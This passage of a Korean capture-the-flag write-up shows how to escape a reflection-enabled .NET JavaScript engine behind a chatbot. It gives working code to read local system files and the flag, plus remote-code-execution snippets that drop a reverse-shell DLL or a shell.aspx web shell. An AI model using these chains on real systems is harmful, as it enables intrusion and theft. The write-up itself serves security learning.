src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_10.png\" alt=\"Screenshot\"></p>\n<p>해당 객체에는 7가지 메서드가 있고, 이를 호출할 수 있습니다. 예를 들어, GetHashCode() 메서드를 호출하려면 this.ProcessChat_helper.GetHashCode()를 사용하여 클래스 이름을 문자열로 가져올 수 있습니다.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetHashCode</span>()\n</code></pre>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_11.png\" alt=\"Screenshot\"></p>\n<div class=\"content-ad\"></div>\n<h2>타입 및 메서드</h2>\n<p>GetAvailableLanguages() 메서드를 호출하려고 시도했더니 다음과 같은 결과가 나왔어요:</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetAvailableLanguages</span>()\n</code></pre>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_12.png\">\n<div class=\"content-ad\"></div>\n<p>우리가 돌아온 반환 유형은 실제 데이터가 아니라 문자열 배열이며, Reflection이 활성화되어 있기 때문에 해당 유형의 메서드를 호출할 수 있습니다. 예를 들어, 함수에서 반환된 배열의 길이를 얻고 싶다면 GetLength(0) 메서드를 호출하여 각 색인의 값 가져오려면 GetValue(index)를 사용합니다:</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-comment\">// 여기서 Zero는 배열의 차원을 나타내며, 우리 경우 1차원 배열</span>\n<span class=\"hljs-keyword\">var</span> len = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetAvailableLanguages</span>().<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>); <span class=\"hljs-comment\">// 2</span>\n<span class=\"hljs-keyword\">var</span> elements = [];\n<span class=\"hljs-keyword\">for</span>(<span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\n  elements.<span class=\"hljs-title function_\">push</span>(<span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetAvailableLanguages</span>().<span class=\"hljs-title class_\">GetValue</span>(i));\n}\nelements.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">', '</span>)\n</code></pre>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_13.png\">\n<p>지금까지는 ProcessChatHelper 클래스의 메서드를 호출할 수 있었지만, 더 다룰 클래스인 System.String[]이 있고, 이 코드를 사용하여 해당 클래스의 함수를 나열할 수 있습니다. GetMethods() 함수는 클래스의 모든 메서드 배열을 반환하므로 이를 활용할 수 있습니다.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> methodsArray = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetAvailableLanguages</span>().<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-title class_\">GetMethods</span>(); \n<span class=\"hljs-keyword\">var</span> len = methodsArray.<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>);\n<span class=\"hljs-keyword\">var</span> methods = [];\n<span class=\"hljs-keyword\">for</span>( <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\n   <span class=\"hljs-keyword\">var</span> typeName = methodsArray.<span class=\"hljs-title class_\">GetValue</span>(i).<span class=\"hljs-title class_\">ToString</span>();\n   methods.<span class=\"hljs-title function_\">push</span>(typeName);\n};\nmethods.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">', '</span>)\n</code></pre>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_14.png\">\n<p>이제 우리는 현재 형식이 직접 상속받는 형식, 즉 부모 클래스의 형식을 가져오는 유형의 속성인 BaseClass를 가져올 수도 있습니다. 이 작업을 System.String[] 유형으로 수행하면 System.Object를 얻게 되는데, 이는 다음 섹션에서 매우 유용하게 사용될 것입니다.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>\n</code></pre>\n<div class=\"content-ad\"></div>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_15.png\">\n<h2>어셈블리</h2>\n<p>지금까지 우리는 System.Object, System.String[]을 가지고 있으며 그 중 어느 것도 플래그 파일을 읽을 수 있는 메소드가 없습니다. 이제 어셈블리 속성이 등장합니다. C# 문서에 따르면 타입의 어셈블리 속성은 어셈블리 인스턴스를 반환하며, 이것은 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 개체로 생각할 수 있습니다.</p>\n<p>다시 말해, 우리가 System.Object 타입을 가지고 있고 이것의 어셈블리 속성에 액세스했다면, 현재 컨텍스트에서 System.Object 클래스를 사용하는 모든 클래스를 포함하는 큰 어셈블리가 있습니다. 이는 우리에게 유용합니다. 왜냐하면 로컬 파일을 읽을 수 있는 다른 타입에 액세스하고 싶기 때문에, 우리는 System.IO.File 타입의 ReadAllText 메소드에 액세스함으로써 이를 수행할 수 있습니다. 다음 코드는 어셈블리 내의 모든 타입을 출력합니다.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\n<span class=\"hljs-keyword\">var</span> len = typesArray.<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>); <span class=\"hljs-comment\">// Array length = 2594 :\"D </span>\n<span class=\"hljs-keyword\">var</span> types= [];\n<span class=\"hljs-keyword\">for</span>( <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\n   types.<span class=\"hljs-title function_\">push</span>(typesArray.<span class=\"hljs-title class_\">GetValue</span>(i).<span class=\"hljs-title class_\">ToString</span>());\n};\ntypes.<span class=\"hljs-title function_\">join</span>(<span class=\"hljs-string\">\", \"</span>)\n</code></pre>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_16.png\">\n<p>어셈블리에 있는 모든 타입들입니다. 2594개의 타입이 있습니다.</p>\n<h2>로컬 파일 노출</h2>\n<div class=\"content-ad\"></div>\n<p>이제 우리는 System.IO.File 유형이 필요하다는 것을 알았으므로, 해당 유형의 배열에서 인덱스를 가져와 직접 액세스할 수 있어야 합니다.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\n<span class=\"hljs-keyword\">var</span> len = typesArray.<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>);\n<span class=\"hljs-keyword\">var</span> types= [];\n<span class=\"hljs-keyword\">for</span>( <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\n   <span class=\"hljs-keyword\">var</span> typeName = typesArray.<span class=\"hljs-title class_\">GetValue</span>(i).<span class=\"hljs-title class_\">ToString</span>();\n   <span class=\"hljs-keyword\">if</span>(typeName == <span class=\"hljs-string\">\"System.IO.File\"</span>){\n      <span class=\"hljs-keyword\">var</span> index = i;\n      <span class=\"hljs-keyword\">break</span>;\n   }\n};\ntypesArray.<span class=\"hljs-title class_\">GetValue</span>(index).<span class=\"hljs-title class_\">ToString</span>() + <span class=\"hljs-string\">\"Type found at index: \"</span> + index\n</code></pre>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_17.png\">\n<p>이제 동일한 방식으로 System.IO.File 유형에서 ReadAllText 메서드를 가져오겠습니다.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\n<span class=\"hljs-keyword\">var</span> fileTypeMethods = typesArray.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">2008</span>).<span class=\"hljs-title class_\">GetMethods</span>();\n<span class=\"hljs-keyword\">var</span> len = fileTypeMethods.<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>);\n<span class=\"hljs-keyword\">var</span> methods = {};\n<span class=\"hljs-keyword\">for</span>( <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\n   <span class=\"hljs-keyword\">var</span> methodName = fileTypeMethods.<span class=\"hljs-title class_\">GetValue</span>(i).<span class=\"hljs-title class_\">ToString</span>();\n   <span class=\"hljs-keyword\">if</span>(methodName.<span class=\"hljs-title function_\">includes</span>(<span class=\"hljs-string\">\"ReadAllText\"</span>)){\n      <span class=\"hljs-keyword\">var</span> index = i;\n      methods[i] = methodName;\n   }\n};\n<span class=\"hljs-title class_\">JSON</span>.<span class=\"hljs-title function_\">stringify</span>(methods)\n</code></pre>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_18.png\">\n<p>필요한 함수는 인덱스 49에 있으므로, 해당 경로로 호출해 보겠습니다. 메서드에 Invoke를 사용할 것입니다. 문서에서 원하는 Invoke 메서드는 2개의 매개변수를 취하며, 둘 다 객체여야 합니다. 첫 번째 매개변수는 해당 메서드를 호출하려는 클래스의 인스턴스여야 하며, 두 번째 매개변수는 메서드에 전달할 인수를 포함하는 배열이어야 합니다. ReadAllText는 정적 메서드이므로 첫 번째 인수는 null이어야 합니다.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\n<span class=\"hljs-keyword\">var</span> fileTypeMethods = typesArray.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">2008</span>).<span class=\"hljs-title class_\">GetMethods</span>();\narg = [<span class=\"hljs-string\">\"c:\\\\windows\\\\win.ini\"</span>];\nfileTypeMethods.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">49</span>).<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>, arg)\n</code></pre>\n<div class=\"content-ad\"></div>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_19.png\" alt=\"2024-06-30-ExploitingaJavaScriptEngineforNET_19\"></p>\n<p>에러가 발생했습니다! 이 에러의 원인은 Invoke 함수가 JavaScript 객체가 아닌 .Net 객체를 매개변수로 취한다는 것입니다. 따라서 함수에 경로가 될 .Net 객체나 .Net 문자열 배열이 필요합니다.</p>\n<p>그래서 열거로 돌아가서, 인스턴스를 가지고 있지 않기 때문에 null이어야 하는 정적 함수를 호출해야 하며, 매개변수를 가져서 하나의 요소로 이루어진 문자열 배열을 반환해야 합니다.</p>\n<p>몇 가지 열거를 통해 System.Environment 클래스의 GetCommandLineArgs 함수가 이 작업을 수행한다는 것을 찾아냈습니다. 그러니 호출하여 문자열 배열을 가져오겠습니다.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\n<span class=\"hljs-keyword\">var</span> len = typesArray.<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>); \n<span class=\"hljs-keyword\">var</span> types= [];\n<span class=\"hljs-keyword\">for</span>( <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\n   <span class=\"hljs-keyword\">var</span> typeName = typesArray.<span class=\"hljs-title class_\">GetValue</span>(i).<span class=\"hljs-title class_\">ToString</span>();\n   <span class=\"hljs-keyword\">if</span>(typeName == <span class=\"hljs-string\">\"System.Environment\"</span>){\n      <span class=\"hljs-keyword\">var</span> typeIndex = i;\n      <span class=\"hljs-keyword\">break</span>;\n   }\n};\n<span class=\"hljs-keyword\">var</span> envType = typesArray.<span class=\"hljs-title class_\">GetValue</span>(typeIndex); <span class=\"hljs-comment\">// typeIndex = 128 </span>\n<span class=\"hljs-keyword\">var</span> oneElemArr = envType.<span class=\"hljs-title class_\">GetMethod</span>(<span class=\"hljs-string\">\"GetCommandLineArgs\"</span>).<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>,<span class=\"hljs-literal\">null</span>).<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">0</span>); \noneElemArr\n</code></pre>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_20.png\">\n<p>이 배열을 사용하여 SetValue(Value, index)로 요소를 원하는 파일 경로로 설정하고 invoke 함수에 전달하면 Local File Disclosure을 얻을 수 있습니다.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\n<span class=\"hljs-keyword\">var</span> fileReadMethods = typesArray.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">2008</span>).<span class=\"hljs-title class_\">GetMethods</span>();\n<span class=\"hljs-keyword\">var</span> envType = typesArray.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">128</span>);\n<span class=\"hljs-keyword\">var</span> oneElemArr = envType.<span class=\"hljs-title class_\">GetMethod</span>(<span class=\"hljs-string\">\"GetCommandLineArgs\"</span>).<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>,<span class=\"hljs-literal\">null</span>); \noneElemArr.<span class=\"hljs-title class_\">SetValue</span>(<span class=\"hljs-string\">\"C:\\\\Windows\\\\System32\\\\drivers\\\\etc\\\\hosts\"</span>, <span class=\"hljs-number\">0</span>);\nfileReadMethods.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">49</span>).<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>, oneElemArr)\n</code></pre>\n<div class=\"content-ad\"></div>\n<img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_21.png\">\n<h2>플래그 읽기</h2>\n<p>이제 도전 과제의 마지막 조각인데요, c:\\temp 디렉터리에 있는 플래그 파일을 읽어야 합니다. 하지만 우리는 플래그의 이름을 모르기 때문에 flag.txt가 아니라고 확신하고 있어요. 제가 시도해 봤기 때문이죠. 따라서 temp 디렉터리에있는 파일을 나열한 다음에 readfile 메서드를 사용하여 읽어야 합니다.</p>\n<p>디렉터리에 있는 파일을 나열하기 위해서, System.IO.Directory 유형의 GetFiles(String path) 메서드가 이를 처리할거에요. 그러니 이를 사용해 봅시다.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\r\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\r\n<span class=\"hljs-keyword\">var</span> len = typesArray.<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>); \r\n<span class=\"hljs-keyword\">var</span> types = [];\r\n<span class=\"hljs-keyword\">for</span>( <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\r\n   <span class=\"hljs-keyword\">var</span> typeName = typesArray.<span class=\"hljs-title class_\">GetValue</span>(i).<span class=\"hljs-title class_\">ToString</span>();\r\n   <span class=\"hljs-keyword\">if</span>(typeName == <span class=\"hljs-string\">\"System.IO.Directory\"</span>){\r\n      <span class=\"hljs-keyword\">var</span> typeIndex = i;\r\n      <span class=\"hljs-keyword\">break</span>;\r\n   }\r\n};\r\n<span class=\"hljs-keyword\">var</span> dirTypeMethods = typesArray.<span class=\"hljs-title class_\">GetValue</span>(typeIndex).<span class=\"hljs-title class_\">GetMethods</span>();\r\n<span class=\"hljs-keyword\">var</span> len = dirTypeMethods.<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>);\r\n<span class=\"hljs-keyword\">var</span> methods = {};\r\n<span class=\"hljs-keyword\">for</span>( <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\r\n   <span class=\"hljs-keyword\">var</span> methodName = dirTypeMethods.<span class=\"hljs-title class_\">GetValue</span>(i).<span class=\"hljs-title class_\">ToString</span>();\r\n   <span class=\"hljs-keyword\">if</span>(methodName.<span class=\"hljs-title function_\">includes</span>(<span class=\"hljs-string\">\"GetFiles\"</span>)){\r\n      <span class=\"hljs-keyword\">var</span> index = i;\r\n      methods[i] = methodName;\r\n   }\r\n};\r\n<span class=\"hljs-keyword\">var</span> getFilesMethod = dirTypeMethods.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">17</span>); <span class=\"hljs-comment\">// GetFile(String) at index 17</span>\r\n<span class=\"hljs-keyword\">var</span> envType = typesArray.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">128</span>);\r\n<span class=\"hljs-keyword\">var</span> oneElemArr = envType.<span class=\"hljs-title class_\">GetMethod</span>(<span class=\"hljs-string\">\"GetCommandLineArgs\"</span>).<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>,<span class=\"hljs-literal\">null</span>); \r\noneElemArr.<span class=\"hljs-title class_\">SetValue</span>(<span class=\"hljs-string\">\"C:\\\\Temp\"</span>, <span class=\"hljs-number\">0</span>);\r\n<span class=\"hljs-comment\">// Getting all the filenames in the c:\\\\temp</span>\r\ntempFilesArr = getFilesMethod.<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>, oneElemArr);\r\n<span class=\"hljs-keyword\">var</span> len = tempFilesArr.<span class=\"hljs-title class_\">GetLength</span>(<span class=\"hljs-number\">0</span>);\r\n<span class=\"hljs-keyword\">var</span> fileReadMethod = typesArray.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">2008</span>).<span class=\"hljs-title class_\">GetMethods</span>().<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">49</span>);\r\n<span class=\"hljs-keyword\">for</span>( <span class=\"hljs-keyword\">let</span> i = <span class=\"hljs-number\">0</span>; i &#x3C; len; i++) {\r\n   <span class=\"hljs-keyword\">var</span> fileName = tempFilesArr.<span class=\"hljs-title class_\">GetValue</span>(i);\r\n   oneElemArr.<span class=\"hljs-title class_\">SetValue</span>(fileName, <span class=\"hljs-number\">0</span>);\r\n   <span class=\"hljs-comment\">// the Flag filename contais Flag and some other random values</span>\r\n   <span class=\"hljs-keyword\">if</span>(fileName.<span class=\"hljs-title function_\">includes</span>(<span class=\"hljs-string\">\"Flag\"</span>)) {\r\n     <span class=\"hljs-comment\">// read the flag file</span>\r\n     <span class=\"hljs-keyword\">var</span> fileContent = fileReadMethod.<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>, oneElemArr);\r\n     <span class=\"hljs-keyword\">break</span>;\r\n   }\r\n};\r\nfileContent\n</code></pre>\n<p><img src=\"/assets/img/2024-06-30-ExploitingaJavaScriptEngineforNET_22.png\" alt=\"Screenshot\"></p>\n<h2>원격 코드 실행</h2>\n<p>RCE에 대해서는 원격에서 작동하지 않아 작동 원인을 알 수 없었지만 로컬에서는 작동했으므로 다른 누군가에게 도움이 될지도 모르니 코드를 공유하겠습니다.</p>\n<div class=\"content-ad\"></div>\n<p>RCE의 아이디어는 System.IO.File 클래스의 WriteAllText(String content, String path)를 사용하여 서버에 악성 .dll 파일을 작성하고, System.Reflection.Assembly 클래스의 LoadFile(String path) 함수를 사용하여 해당 파일을 로드하는 것입니다. 여기서 역쉘 dll 파일의 코드를 찾을 수 있습니다. 이를 컴파일한 후 hex로 인코딩하고 바이트를 \\x69 형식으로 작성하여 코드 내에서 해당 부분을 대체하십시오.</p>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\n<span class=\"hljs-keyword\">var</span> fileTypeMethods = typesArray.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">2008</span>).<span class=\"hljs-title class_\">GetMethods</span>();\n<span class=\"hljs-keyword\">var</span> writeFileMethod = fileTypeMethods.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">51</span>);\n<span class=\"hljs-keyword\">var</span> writeFileArgs = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetAvailableLanguages</span>();\nwriteFileArgs.<span class=\"hljs-title class_\">SetValue</span>(<span class=\"hljs-string\">\"c:\\\\temp\\\\z4ki.dll\"</span>, <span class=\"hljs-number\">0</span>);\nwriteFileArgs.<span class=\"hljs-title class_\">SetValue</span>(<span class=\"hljs-string\">\"\\x7a\\x34\\x6b\\x69\"</span>, <span class=\"hljs-number\">1</span>); <span class=\"hljs-comment\">// &#x3C;--  여기를 편집하세요</span>\nwriteFileMethod.<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>, writeFileArgs);\n<span class=\"hljs-keyword\">var</span> assemblyType = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>\n<span class=\"hljs-keyword\">var</span> oneElemArr = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>().<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">128</span>).<span class=\"hljs-title class_\">GetMethod</span>(<span class=\"hljs-string\">\"GetCommandLineArgs\"</span>).<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>,<span class=\"hljs-literal\">null</span>);\noneElemArr.<span class=\"hljs-title class_\">SetValue</span>(<span class=\"hljs-string\">\"C:\\\\Temp\\\\z4ki.dll\"</span>,<span class=\"hljs-number\">0</span>);\nassemblyType.<span class=\"hljs-title class_\">GetMethod</span>(<span class=\"hljs-string\">\"LoadFile\"</span>).<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>,oneElemArr);\n</code></pre>\n<h2>또 다른 RCE 방법</h2>\n<p>다른 방법으로는, 서버의 웹 루트에 shell.aspx 파일을 작성하여 라이브러리에서 원격 코드 실행을 얻을 수 있습니다. 그러나 불행하게도 웹 루트에 쓰기 권한이 없었지만 참고를 위해 코드를 여기에 남깁니다.</p>\n<div class=\"content-ad\"></div>\n<pre><code class=\"hljs language-js\"><span class=\"hljs-keyword\">var</span> objectClass = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetType</span>().<span class=\"hljs-property\">BaseType</span>;\n<span class=\"hljs-keyword\">var</span> typesArray = objectClass.<span class=\"hljs-property\">Assembly</span>.<span class=\"hljs-title class_\">GetTypes</span>();\n<span class=\"hljs-keyword\">var</span> fileTypeMethods = typesArray.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">2008</span>).<span class=\"hljs-title class_\">GetMethods</span>();\n<span class=\"hljs-keyword\">var</span> writeFileMethod = fileTypeMethods.<span class=\"hljs-title class_\">GetValue</span>(<span class=\"hljs-number\">51</span>);\n<span class=\"hljs-keyword\">var</span> writeFileArgs = <span class=\"hljs-variable language_\">this</span>.<span class=\"hljs-property\">ProcessChat_Helper</span>.<span class=\"hljs-title class_\">GetAvailableLanguages</span>();\nwriteFileArgs.<span class=\"hljs-title class_\">SetValue</span>(<span class=\"hljs-string\">\"c:\\\\ChatBot\\\\wwwroot\\\\shell.aspx\"</span>, <span class=\"hljs-number\">0</span>);\nwriteFileArgs.<span class=\"hljs-title class_\">SetValue</span>(<span class=\"hljs-string\">\"\\x7a\\x34\\x6b\\x69\"</span>, <span class=\"hljs-number\">1</span>); <span class=\"hljs-comment\">// &#x3C;--  여기를 수정하세요</span>\nwriteFileMethod.<span class=\"hljs-title class_\">Invoke</span>(<span class=\"hljs-literal\">null</span>, writeFileArgs);\n</code></pre>\n<p>이제 http://<code>ip</code>/shell.aspx 로 이동하면 쉘을 찾을 수 있습니다.</p>\n<p>여기까지 오신 당신에게 경의를 표하며 읽기를 즐겼고 새로운 것을 배웠기를 바랍니다. 궁금한 점이 있으면 LinkedIn에서 연락해 주세요.</p>\n</body>\n</html>\n"},"__N_SSG":true}